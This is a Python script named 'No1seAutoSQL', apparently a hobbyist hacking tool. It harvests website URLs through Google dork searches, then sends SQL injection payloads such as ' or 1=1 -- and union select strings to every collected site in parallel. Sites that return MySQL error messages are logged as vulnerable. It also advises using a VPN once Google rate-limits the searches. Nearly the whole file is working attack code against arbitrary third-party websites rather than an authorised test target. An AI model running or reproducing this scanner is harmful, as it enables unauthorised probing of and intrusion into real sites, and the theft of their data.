import requests
import concurrent.futures
import random
import os
import user_agent
from colorama import init, Fore, Style
from googlesearch import search
import sys
import time
import platform
from tqdm import tqdm
from urllib.parse import unquote

        #Coded And Made By no1se
init(autoreset=True)

# Clear function like always
def clear():
    windows = "cls"
    linux = "clear"
    if platform.system() == "Windows":
        os.system(windows)
    else:
        os.system(linux)


# art
art = """
        ██████  ██████  ██████  ███████ ██████      ██████  ██    ██     ███    ██  ██████   ██ ███████ ███████ 
        ██      ██    ██ ██   ██ ██      ██   ██     ██   ██  ██  ██      ████   ██ ██    ██ ███ ██      ██      
        ██      ██    ██ ██   ██ █████   ██   ██     ██████    ████       ██ ██  ██ ██    ██  ██ ███████ █████   
        ██      ██    ██ ██   ██ ██      ██   ██     ██   ██    ██        ██  ██ ██ ██    ██  ██      ██ ██      
        ██████  ██████  ██████  ███████ ██████      ██████     ██        ██   ████  ██████   ██ ███████ ███████ 
                                                1.0                                                                 
"""

art2 = """
        ██████╗ ██████╗ ██████╗ ███████╗██████╗     ██████╗ ██╗   ██╗    ███╗   ██╗ ██████╗  ██╗███████╗███████╗
        ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗    ██╔══██╗╚██╗ ██╔╝    ████╗  ██║██╔═══██╗███║██╔════╝██╔════╝
        ██║     ██║   ██║██║  ██║█████╗  ██║  ██║    ██████╔╝ ╚████╔╝     ██╔██╗ ██║██║   ██║╚██║███████╗█████╗  
        ██║     ██║   ██║██║  ██║██╔══╝  ██║  ██║    ██╔══██╗  ╚██╔╝      ██║╚██╗██║██║   ██║ ██║╚════██║██╔══╝  
        ╚██████╗╚██████╔╝██████╔╝███████╗██████╔╝    ██████╔╝   ██║       ██║ ╚████║╚██████╔╝ ██║███████║███████╗
        ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═════╝     ╚═════╝    ╚═╝       ╚═╝  ╚═══╝ ╚═════╝  ╚═╝╚══════╝╚══════╝
                                                2.0
"""

#My Amazing intro
def intro():
    print(Fore.RED + art)
    time.sleep(0.5)
    clear()
    print(Fore.BLUE + art2)
    time.sleep(0.5)
    clear()
    print(Fore.LIGHTCYAN_EX + art)
    time.sleep(0.5)
    clear()
    print(Fore.LIGHTMAGENTA_EX + art2)

def step1():
    print(f"{Fore.GREEN}You can choose from 1-1000. Recommended: 200")
    num_dorks = int(input(f"{Fore.CYAN}How many dorks would you like to scan? "))
    clear()
    print(Fore.GREEN+"Starting the first Step. Please be patient it will take some time. Don't stop the script!")
    with open('dorks.txt', 'r') as file:
        dorks = [line.strip() for line in file.readlines()[:num_dorks]]
        #By the way, you can add more dorks if you would like to.
    urls = []
    for dork in tqdm(dorks, desc=f"{Fore.YELLOW}Searching Google..."):
        try:
            for url in search(dork):
                urls.append(url)
        except Exception as e:
            print(f"{Fore.RED} Request failed with status code {Fore.WHITE}429")
            print(f"{Fore.RED} Try to use {Fore.WHITE}VPN")
            fuck = input(f"{Fore.YELLOW}Google blocked us G Would you like to continue with what we got?(y/n): ")
            if fuck.lower() == "y" or fuck.lower() == "yes" or fuck.upper() == "Y":
                break
            else:
                print(f"{Fore.RED} Existing...")
                exit()
                    
    with open('targets.txt', 'w') as file:
        for url in urls:
            file.write(url + '\n')
#######################################################################################################
def sqlscan():
    urls = []
    sqli_payloads = [
        "'",
        "\"",
        "--",
        ";",
        "/*",
        "*/",
        "' or 1=1 --",
        "\" or 1=1 --",
        "' union select 1,2,3 --",
        "\" union select 1,2,3 --",
        "' and 1=0 union select 1,2,3 --",
        "\" and 1=0 union select 1,2,3 --",
    ]

    def sql(url):
        url = url.strip()
        for payload in sqli_payloads:
            check_sql(url, payload)

    def check_sql(url, payload):
        sqli_url = url + payload

        try:
            with requests.Session() as session:
                response = session.get(sqli_url)
                if "sql syntax" in response.text.lower() or "mysql_fetch" in response.text.lower() or "mysql_num_rows" in response.text.lower():
                    with open("work.txt", "a") as f:
                        f.write(f"{url} {payload}\n")
                    print(f"{Fore.GREEN}Found one! {Fore.LIGHTYELLOW_EX}{url} {payload}")
                else:
                    print(f"{Fore.RED}Not found! {Fore.LIGHTYELLOW_EX}{url} {payload}")
        except Exception as e:
            print(f"{Fore.BLACK}Request failed for {url} {payload}: {e}")

    with open("targets.txt", "r") as f:
        urls = f.read().splitlines()

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(sql, urls)


def main_menu():
    clear()
    #Squidward
    print("        .--'''''''''--.")
    print("     .'      .---.      '.")
    print("    /    .-----------.    \'")
    print("   /        .-----.        \'")
    print("   |       .-.   .-.       |")
    print("   |      /   \ /   \      |")
    print("    \    | .-. | .-. |    /")
    print("     '-._| | | | | | |_.-'")
    print("         | '-' | '-' |")
    print("          \___/ \___/")
    print("       _.-'  /   \  `-._")
    print("     .' _.--|     |--._ '.")
    print("     ' _...-|     |-..._ '")
    print("            |     |")
    print("            '.___.'")
#Squidward
    print(Fore.RED+"Welcome to No1seAutoSQL")
    print(Fore.LIGHTYELLOW_EX+"Please select an option:")
    print(f"{Fore.WHITE}1. Scan the web for SQL injection{Style.RESET_ALL}")
    print(f"{Fore.WHITE}2. Scan for SQL injection using an existing targets.txt after selecting option one.{Style.RESET_ALL}")
    print(f"{Fore.LIGHTYELLOW_EX}3. Exit{Style.RESET_ALL}")
    selection = input(Fore.RED+"Select an option: "+Fore.WHITE)
    return selection


while True:
    clear()
    intro()
    time.sleep(0.5)
    selection = main_menu()
    if selection == "1":
        clear()
        step1()
        clear()
        print(Fore.GREEN+"Step one has been completed, and we have gathered the dorks.")
        time.sleep(2)
        print(Fore.RED+"Starting the scan in 10 seconds, please don't do anything in the middle of the scan!")
        time.sleep(10)
        clear()
        sqlscan()
        clear()
        print(Fore.GREEN+"Results are done and saved to work.txt.")
        remove = input(Fore.GREEN+"Would you like to remove the targets.txt file? (y/n): ")
        if remove.lower() == "y" or remove.lower() == "yes" or remove.upper() == "Y":
            cleartxt = "targets.txt"
            os.remove(cleartxt)
        else:
            intro()
            exit(1)
        
    elif selection == "2":
        clear()
        sqlscan()
    elif selection == "3":
        print(Fore.BLACK+"Exiting...")
        sys.exit(0)
    else:
        print(Fore.RED + "Invalid option. Please try again.")
        time.sleep(3)


        #Coded And Made By no1se